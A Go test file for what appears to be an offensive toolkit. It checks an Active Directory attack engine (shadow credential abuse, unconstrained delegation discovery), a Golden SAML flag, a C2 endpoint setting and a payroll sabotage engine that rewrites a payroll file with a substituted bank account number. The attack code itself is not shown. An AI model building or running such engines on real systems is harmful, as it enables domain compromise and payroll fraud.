package v30

import (
	"testing"
)

func TestDefaultV30Config(t *testing.T) {
	cfg := DefaultV30Config()
	if cfg == nil {
		t.Fatal("DefaultV30Config returned nil")
	}
	if cfg.Simulation != true {
		t.Error("Simulation should default to true")
	}
}

func TestV30ConfigFlags(t *testing.T) {
	cfg := DefaultV30Config()

	flags := []struct {
		name string
		val  bool
	}{
		{"PayrollSabotage", cfg.PayrollSabotage},
		{"ADShadowCreds", cfg.ADShadowCreds},
		{"GoldenSAML", cfg.GoldenSAML},
		{"PluginSystem", cfg.PluginSystem},
		{"SPIFFEmTLS", cfg.SPIFFEmTLS},
		{"FingerprintScan", cfg.FingerprintScan},
	}

	for _, f := range flags {
		if !f.val {
			t.Logf("Flag %s: %v (simulation)", f.name, f.val)
		}
	}
}

func TestNewADAttackEngine(t *testing.T) {
	cfg := DefaultV30Config()
	engine := NewADAttackEngine(cfg)
	if engine == nil {
		t.Fatal("NewADAttackEngine() returned nil")
	}
}

func TestNewPayrollSabotageEngine(t *testing.T) {
	cfg := DefaultV30Config()
	engine := NewPayrollSabotageEngine(cfg)
	if engine == nil {
		t.Fatal("NewPayrollSabotageEngine() returned nil")
	}
}

func TestADAttackEngineDiscoverDelegations(t *testing.T) {
	cfg := DefaultV30Config()
	engine := NewADAttackEngine(cfg)

	delegations := engine.DiscoverUnconstrainedDelegation()
	if len(delegations) == 0 {
		t.Log("No unconstrained delegations found (expected in test env)")
	} else {
		t.Logf("Delegations: %v", delegations)
	}
}

func TestPayrollSabotageEngineScan(t *testing.T) {
	cfg := DefaultV30Config()
	engine := NewPayrollSabotageEngine(cfg)

	files := engine.ScanForPayrollFiles("/tmp")
	if len(files) == 0 {
		t.Log("No payroll files found (expected in test env)")
	} else {
		t.Logf("Payroll files: %v", files)
	}
}

func TestV30ConfigAllEnabled(t *testing.T) {
	cfg := DefaultV30Config()
	cfg.PayrollSabotage = true
	cfg.ADShadowCreds = true
	cfg.GoldenSAML = true
	cfg.PluginSystem = true
	cfg.SPIFFEmTLS = true
	cfg.FingerprintScan = true

	if !cfg.PayrollSabotage || !cfg.ADShadowCreds || !cfg.GoldenSAML ||
		!cfg.PluginSystem || !cfg.SPIFFEmTLS || !cfg.FingerprintScan {
		t.Error("All flags should be enabled")
	}
}

func TestV30ConfigC2Endpoint(t *testing.T) {
	cfg := DefaultV30Config()
	if cfg.C2Endpoint == "" {
		t.Log("C2Endpoint empty (default)")
	}
}

func TestADAttackEngineShadowCreds(t *testing.T) {
	cfg := DefaultV30Config()
	engine := NewADAttackEngine(cfg)

	creds := engine.AbuseShadowCredentials("DC01.corp.local")
	if len(creds) == 0 {
		t.Log("Shadow credentials empty (expected in test env)")
	}
}

func TestPayrollSabotageEngineModify(t *testing.T) {
	cfg := DefaultV30Config()
	engine := NewPayrollSabotageEngine(cfg)

	result := engine.ModifyPayroll("/tmp/payroll.xml", "ES1234567890123456789012")
	t.Logf("ModifyPayroll result: %v", result)
}
